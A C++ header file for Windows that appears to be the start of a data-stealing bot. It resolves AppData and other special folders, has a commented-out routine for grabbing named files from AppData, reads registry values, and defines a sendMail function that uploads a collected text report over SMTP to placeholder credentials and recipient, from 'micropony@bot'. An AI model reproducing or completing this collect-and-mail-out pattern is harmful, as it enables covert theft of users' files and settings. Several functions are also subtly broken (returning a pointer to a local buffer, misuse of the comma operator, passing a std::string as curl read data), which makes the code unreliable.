#pragma once

#include <windows.h>
#include <Shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include "SimpleIni.h"
#include "curl.h"

struct List
{
	CSimpleIniA::TNamesDepend keys;
	CSimpleIniA::TNamesDepend values;
	CSimpleIniA::TNamesDepend sections;
};

struct Report
{
	std::vector<std::string> paths;
	std::vector<std::string> params;
	std::vector<std::string> values;

	std::vector<LPCWSTR> names;
	std::vector<LPCWSTR> catalogs;
};

// Get path
TCHAR* getPath(unsigned int CSIDL)
{
	TCHAR szPath[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL, NULL, 0, szPath))) {
		return szPath;
	}
	else {
		return nullptr;
	}
}

/*
std::vector<WIN32_FIND_DATA>& getCatalog(LPCWSTR path) {
	HANDLE search_file;
	WIN32_FIND_DATA aa;
	std::vector<WIN32_FIND_DATA> vecFiles;

	search_file = FindFirstFile(path, &aa);
	while (FindNextFile(search_file, &aa) != NULL) {
		vecFiles.push_back(aa);
	}

	return vecFiles;
}


LPCWSTR grabFile(LPCWSTR path, LPCWSTR namefile)
{
	LPCWSTR catalog = (getPath(CSIDL_APPDATA) + std::wstring(path)).c_str();
	//std::wcout << catalog << '\n';
	for (auto& name : getCatalog(catalog)) {
		if (name.cFileName == namefile && name.cFileName != NULL) {
			return name.cFileName, catalog;
		}
	}
}
*/

std::string getKeyValue(HKEY reg, LPCSTR path, LPCSTR param)
{
	DWORD dwType = REG_SZ;
	HKEY rKey;
	char value[1024];
	DWORD value_length = sizeof(value);
	RegOpenKeyEx(reg, path, 0, KEY_QUERY_VALUE, &rKey);
	RegQueryValueEx(rKey, param, NULL, &dwType, (LPBYTE)&value, &value_length);
	RegCloseKey(rKey);

	return std::string(value);
}

int sendMail(std::string text)
{
	CURL *curl;
	CURLcode curl_code;
	//FILE *message;
	//message = fopen(mail_path, "r");
	struct curl_slist *recipients = nullptr; // NULL

	curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_USERNAME, "xxx"); // username
		curl_easy_setopt(curl, CURLOPT_PASSWORD, "xxx"); // pass
		curl_easy_setopt(curl, CURLOPT_URL, "yyy:ppp"); // url smtp

		recipients = curl_slist_append(recipients, "ttt"); // to
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "micropony@bot"); // from
		curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_READDATA, text);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

		curl_code = curl_easy_perform(curl);

		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}

	return curl_code;
}